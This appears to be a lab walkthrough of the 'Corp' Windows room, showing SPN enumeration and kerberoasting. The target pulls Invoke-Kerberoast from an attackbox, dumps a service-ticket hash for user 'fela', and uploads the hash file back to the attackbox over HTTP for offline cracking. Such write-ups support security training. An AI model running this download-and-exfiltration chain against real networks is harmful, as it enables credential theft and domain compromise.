# Corp

Bypass Windows Applocker and escalate your privileges. Also covers examples of kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.

---
## Task 1: Bypassing Applocker

- Applocker introduced in 2007
- Allows restriction by path, hash, publisher
- Windows Powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Answer: obtained straight from ConsoleHost_history.txt file

Task 3:

Non credentialed method to enumerate Windows with powershell to extract all accounts in the SPN:
```
setspn -T medin -Q */*
```
```
PS C:\Users\dark> setspn -T medin -Q */*

Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin", 0x00000051

Warning: No valid targets specified, reverting to current domain.

CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
    Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
    ldap/omega.corp.local/ForestDnsZones.corp.local
    ldap/omega.corp.local/DomainDnsZones.corp.local
    TERMSRV/OMEGA
    TERMSRV/omega.corp.local
    DNS/omega.corp.local
    GC/omega.corp.local/corp.local
    RestrictedKrbHost/omega.corp.local
    RestrictedKrbHost/OMEGA
    RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
    HOST/OMEGA/CORP
    HOST/omega.corp.local/CORP
    HOST/OMEGA
    HOST/omega.corp.local
    HOST/omega.corp.local/corp.local
    E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
    ldap/OMEGA/CORP
    ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
    ldap/omega.corp.local/CORP
    ldap/OMEGA
    ldap/omega.corp.local
    ldap/omega.corp.local/corp.local

CN=krbtgt,CN=Users,DC=corp,DC=local
    kadmin/changepw

CN=fela,CN=Users,DC=corp,DC=local
    HTTP/fela
    HOST/fela@corp.local
    HTTP/fela@corp.local

Existing SPN found!

PS C:\Users\dark>
```
Answer: User for existing SPN is fela

Next use invoke-kerberoast and obtain a ticket:

First download the Invoke-Kerberoast.ps1 from either use wget, curl or just firefox browser.

```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 ​‌
```
Then transfer from attackbox to target:
```
PS C:\users\dark\downloads> Invoke-WebRequest -Uri http://10.66.96.187/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1
PS C:\users\dark\downloads> dir


    Directory: C:\users\dark\downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/11/2026   7:03 AM          46848 Invoke-Kerberoast.ps1

```

```
PS C:\Users\dark> . .\Invoke-Kerberoast.ps1
PS C:\Users\dark> Kerberoast
Kerberoast : The term 'Kerberoast' is not recognized as the name of a cmdlet, function, script file, or operable
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Kerberoast
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Kerberoast:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\dark> invoke-Kerberoast


TicketByteHexStream  :
Hash                 : $krb5tgs$HTTP/fela:C0A2CB48F3039E24756B9EB0AED1B93A$F4D98B830385B74F767F67E7CD0ECAF4EB87A0C93ED3
                       A8517AAA967435F0DD90FC907DF1B7477BD7571856B7FBD7778931B7F71A6349590E954516E037102F0DB17DCFA5C993
                       69FBA4B1759B70A73FCCF73D6B37CB594CE48FAC642B41D37778A75797BCDF72E4DB9470F7FF3D2911012FBDD7F7D84E
                       82F3693F77F2A0E33C8FEA43A87BD927AA606D89397EB40F69C6F2078085716E8875CE3496F91D65653FBAE8F0870B91
                       DC26549F1312D4AFEF02D27A0856C4AAECFAF69550287906EC50569FA258696CAFCC63F5607CBAECA1955FA974C3E101
                       08244887135B54FE7E5AA0D267B9D745A61A470B660A546CC2582FFB0C066600876C399653F887779F2D6CB67B0E9556
                       D694B39B3280ED916E0377C27EF3BCCC078B3AD21D6DB9AEC9C2D525DDE46895D125D2EC2B22CD127DE42BD5ECCE286B
                       B699B114CC973141607B64C7730FBF00CBB4272C5F2150FB85257E0E10FC1314467F86D74B84DF5330BC76BD13B3A92E
                       8401C0CCCC042AB06BB372E52B1893A0C398100FDA6D9A6077EDF0543C64FA4950B91C623C26620C8064521523871582
                       30A0461F1F2B6B9C837D0A0AA44AD7B922E475DC406FB544EBE7AF7A715C5D66EEAED6463D0CA7ED14DB2E8951B09CE8
                       AD58702EB52243609B7DF2D5FD0B19E77AE5A58844C7A979D3610A1A4FD53996C56E150EDDD9F61908D2154C191CA03D
                       89DD199DAF59B0C8334FBDDDE6FF9314D22E238626946AF92EF1E5A2AA9484B5FF6A11F337897AB4D09E12C03DB81B70
                       A05ED59253CEC32433D1AD16103A7636CF5FE2B14A630D1E2EB8AC78334654F455B2A1A8D132D56C67DB0038CC9579BD
                       89B219B10DC10CF58E536ADF4729CC32476E18FA4757CF0F8246FE24211D63A5DAD3F590515B3CB146AB6F80655421C1
                       043A558054AD277139F30282049F83F7142791929BCD33E3040C4EBD40F13D069D36BE59E41E15BDA1F4930474F9941E
                       751F35AE46BA85FC62552666486EE29D0AC70B02905A3CEA530FD90A09434AB6F939A98B272DC65E67A5F422E581AF9A
                       D053D85A063C2E2374F6CDFF90EE5DF37C23C8E7A88F335C61356518FC393E7E5E124AD638E28D5A856A248224DEC803
                       20D12907EA2BE42E8274F1528ACB32A4D62B058CBB827C01968F5FF6EE6D137474542CD9813505AC0A69A6F191B3E16C
                       F71EBD081C57016F43D184672187FB6E136731BCF8C3BFEDC02D78DCEAB03C44F1E42B76D940FE297C47ACBB56592CA5
                       946ED69B9160924A24A17D19A751286DFF616606A0D71A90897AE3F185242BC59080E8387D9948A528E3A3E4121EC11C
                       5B402A0ABA85CF8A5C6ABBB71BDA32C30905FDD4A8CA4198A4AFEAFF43C8B0BDC61F6AB8C93CE6EB11D8126729CD016E
                       7AF423411F8BECEC8C300B
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```
Save to File ToCrack.txt

Incase upload server not installed first two options impacket smb server easier if installed but not if not installed. So since was not went with easier option uploadserver:

```
root@ip-10-66-116-47:~# python3 -m uploadserver 80
/usr/local/pyenv/versions/3.8.20/bin/python3: No module named uploadserver

root@ip-10-66-116-47:~# pip3 install uploadserver
Collecting uploadserver
  Downloading uploadserver-5.2.2-py3-none-any.whl (20 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-5.2.2
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv

[notice] A new release of pip is available: 23.0.1 -> 25.0.1
[notice] To update, run: pip install --upgrade pip

root@ip-10-66-116-47:~# python3 -m uploadserver 80
File upload available at /upload
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.66.129.99 - - [11/Oct/2026 08:13:30] [Uploaded] "ToCrack.txt" --> /root/ToCrack.txt
10.66.129.99 - - [11/Oct/2026 08:13:30] "POST /upload HTTP/1.1" 204 -
```
upload file to attackbox.
```
PS C:\Users\dark> curl.exe -F "files=@C:\users\dark\ToCrack.txt" http://10.66.116.47/upload
PS C:\Users\dark>
```

